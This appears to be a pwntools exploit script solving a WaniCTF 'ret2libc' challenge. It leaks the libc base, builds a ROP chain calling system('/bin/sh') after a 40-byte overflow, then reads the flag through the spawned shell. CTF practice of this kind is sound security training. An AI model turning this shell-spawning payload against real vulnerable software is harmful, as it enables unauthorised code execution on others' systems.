from pwn import *

# p = process('./chall')
elf = ELF('./chall')
lib = elf.libc
p = remote('ret2libc-pwn.wanictf.org', 9007)

p.recvuntil(b' +0x28 | 0x')
base_addr = int(p.recv(16), 16) - 0x29d90
print(hex(base_addr))
bin_sh_addr = base_addr + next(lib.search(b'/bin/sh'))
system_addr = base_addr + lib.sym['system']
pop_addr = base_addr + 0x000000000002a745

payload = b'a' * 40 + p64(pop_addr) + p64(bin_sh_addr) + p64(0) + p64(system_addr) + b'a' * (80 - 24)
p.sendline(payload)
p.sendline(b'cat FLAG')
p.interactive()
